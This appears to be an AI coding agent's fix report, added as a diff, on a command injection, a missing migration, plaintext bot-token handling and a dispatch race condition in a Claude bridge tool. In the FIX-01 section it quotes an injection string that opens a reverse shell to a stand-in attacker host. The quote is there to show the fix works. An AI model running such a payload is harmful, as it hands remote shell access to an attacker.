@@ -1,0 +1,201 @@
+================================================================================
+  PHASE 1 FIX REPORT
+  Date: 2026-04-03
+  Agent: claude-bridge (claude-sonnet-4-6)
+  Status: ALL FIXES APPLIED — 443 tests PASS, 0 regressions
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FIX-01 [S1] Command injection — channel/lib.ts bridgeCli()
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: DONE
+
+File: channel/lib.ts (lines 405-430)
+
+Changes:
+  1. Added `execFileSync` to import from "child_process"
+  2. Replaced shell string building (escapedArgs + string interpolation) with
+     direct execFileSync calls passing args as array — no shell interpretation
+  3. For bridge-cli path:
+       execFileSync("bridge-cli", [command, ...args], execOpts)
+  4. For python fallback path:
+       execFileSync(pythonPath, ["-m", "claude_bridge.cli", command, ...args],
+         { ...execOpts, env: { ...process.env, PYTHONPATH: srcPath } })
+
+Security improvement:
+  - Shell metacharacters (single-quote, backtick, $(), newline) in args are
+    never interpreted — they are passed as literal strings to the subprocess
+  - Attack vector from review (`hello"; bash -i >& /dev/tcp/evil.com/4444`) no
+    longer works because no shell is involved
+
+Test: Channel lib tests pass (34 tests in test_channel.py)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FIX-02 [R5] Migration thiếu "reported" column — db.py
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: DONE
+
+File: src/claude_bridge/db.py (line 151 in migrations list)
+
+Change: Added ("tasks", "reported", "INTEGER DEFAULT 0") to _migrate() list
+
+Before:
+  migrations = [
+      ...
+      ("tasks", "channel_message_id", "TEXT"),
+      ("agents", "model", "TEXT DEFAULT 'sonnet'"),
+  ]
+
+After:
+  migrations = [
+      ...
+      ("tasks", "channel_message_id", "TEXT"),
+      ("tasks", "reported", "INTEGER DEFAULT 0"),   ← added
+      ("agents", "model", "TEXT DEFAULT 'sonnet'"),
+  ]
+
+Why this matters:
+  - SCHEMA has `reported INTEGER DEFAULT 0` in CREATE TABLE tasks
+  - But existing DBs (created before this column was added) would not have it
+  - Without the migration entry, `get_unreported_tasks()` would fail on old DBs
+    because the partial index `idx_tasks_unreported` references `reported`
+
+New tests added (TestMigration class in test_db.py):
+  - test_reported_column_exists_on_new_db: verifies fresh DB has column
+  - test_reported_column_added_by_migration: simulates legacy DB without column,
+    verifies BridgeDB._migrate() adds it successfully
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FIX-03 [S4] Bot token plaintext trong .mcp.json
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: DONE
+
+File: src/claude_bridge/cli.py (cmd_setup_bot function, after mcp_json write)
+
+Changes:
+  1. After writing .mcp.json, automatically add ".mcp.json" entry to .gitignore
+     in the bot_dir (creates .gitignore if not present, appends if exists,
+     skips if already present — idempotent)
+  2. Prints ⚠️ WARNING about plaintext token and not committing to git
+
+Why token stays in .mcp.json:
+  - The channel server (bun) reads TELEGRAM_BOT_TOKEN from env
+  - MCP config's `env` section is the only supported mechanism to pass env vars
+    to the server process from Claude Code's .mcp.json
+  - Using "${TELEGRAM_BOT_TOKEN}" as a placeholder would cause the bun process
+    to receive literal string "${TELEGRAM_BOT_TOKEN}", not the actual token →
+    authentication would fail
+  - Mitigation: gitignore entry prevents accidental git commit of the token
+
+Output example:
+  .mcp.json → /path/to/botdir/.mcp.json
+  .gitignore ← added .mcp.json entry
+  ⚠️  WARNING: .mcp.json contains your Telegram bot token in plaintext.
+     It has been added to .gitignore. DO NOT commit .mcp.json to git.
+
+New tests added (TestSetupBotGitignore class in test_setup_wizard.py):
+  - test_gitignore_created_with_mcp_json: .gitignore created with .mcp.json entry
+  - test_gitignore_appended_if_exists: existing .gitignore gets entry appended,
+    original content preserved
+  - test_gitignore_not_duplicated: running setup twice doesn't duplicate the entry
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FIX-04 [E6] Dispatch race condition — cli.py
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Status: DONE
+
+Files:
+  - src/claude_bridge/db.py: new method `atomic_check_and_create_task()`
+  - src/claude_bridge/cli.py: cmd_dispatch() now uses the new method
+
+New method in BridgeDB (db.py):
+  def atomic_check_and_create_task(
+      self, session_id, prompt, channel, channel_chat_id, channel_message_id
+  ) -> tuple[int | None, bool]:
+
+  Mechanism:
+    1. Saves isolation_level, switches conn to autocommit (isolation_level=None)
+    2. Executes BEGIN EXCLUSIVE → takes exclusive write lock on the DB
+    3. Checks for running task (status='running')
+    4. If running: COMMIT, return (None, True) — caller should queue
+    5. If free: INSERTs task with status='running' (not 'pending'), COMMIT,
+       returns (task_id, False) — caller should spawn
+    6. On exception: ROLLBACK, re-raise
+    7. Restores isolation_level in finally block
+
+  Why status='running' in the INSERT:
+    - Inserting as 'running' immediately prevents the second concurrent dispatch
+      from seeing "no running task" and also spawning
+    - If spawn fails, the task is already in 'running' state and will be
+      detected as a dead PID by the watcher (which marks it 'failed')
+
+Changes in cmd_dispatch (cli.py lines 286-316):
+  BEFORE:
+    running = db.get_running_task(session_id)   ← race here
+    if running:
+        # queue
+    task_id = db.create_task(...)               ← could happen twice concurrently
+    pid = spawn_task(...)
+    db.update_task(task_id, status='running', pid=pid, ...)
+
+  AFTER:
+    task_id, is_busy = db.atomic_check_and_create_task(...)  ← exclusive lock
+    if is_busy:
+        queued_id = db.create_task(...)   ← queue it
+        ...
+        return 0
+    # task_id already created with status='running'
+    pid = spawn_task(...)
+    db.update_task(task_id, pid=pid, result_file=..., ...)  ← no status= here
+
+New tests added (TestAtomicDispatch class in test_db.py):
+  - test_reserves_free_agent: atomic method creates task with status='running'
+  - test_detects_busy_agent: returns is_busy=True when agent has running task
+  - test_exclusive_prevents_double_spawn: sequential calls → only first succeeds
+  - test_preserves_channel_info: channel metadata stored correctly
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  TEST RESULTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Before fixes: 434 tests pass
+After fixes:  443 tests pass (9 new tests added)
+Regressions:  0
+
+New tests breakdown:
+  TestMigration (test_db.py):           2 tests  [FIX-02]
+  TestAtomicDispatch (test_db.py):      4 tests  [FIX-04]
+  TestSetupBotGitignore (test_setup_wizard.py): 3 tests  [FIX-03]
+  FIX-01 (channel/lib.ts):             verified via existing test_channel.py
+
+Command run: python -m pytest tests/ --tb=short
+Result: 443 passed in ~36s
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FILES CHANGED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+channel/lib.ts
+  - Import: added execFileSync
+  - Function bridgeCli(): complete rewrite — no shell string, uses execFileSync
+
+src/claude_bridge/db.py
+  - _migrate(): added ("tasks", "reported", "INTEGER DEFAULT 0") to migrations
+  - BridgeDB: added atomic_check_and_create_task() method
+
+src/claude_bridge/cli.py
+  - cmd_dispatch(): use atomic_check_and_create_task() instead of
+    get_running_task() + create_task() (prevents race condition)
+  - cmd_setup_bot(): after writing .mcp.json, add .mcp.json to .gitignore
+    and print security warning
+
+tests/test_db.py
+  - Added TestMigration class (2 tests)
+  - Added TestAtomicDispatch class (4 tests)
+
+tests/test_setup_wizard.py
+  - Added TestSetupBotGitignore class (3 tests)
+
+================================================================================
+  COMMIT STATUS: NOT committed (as instructed)
+================================================================================
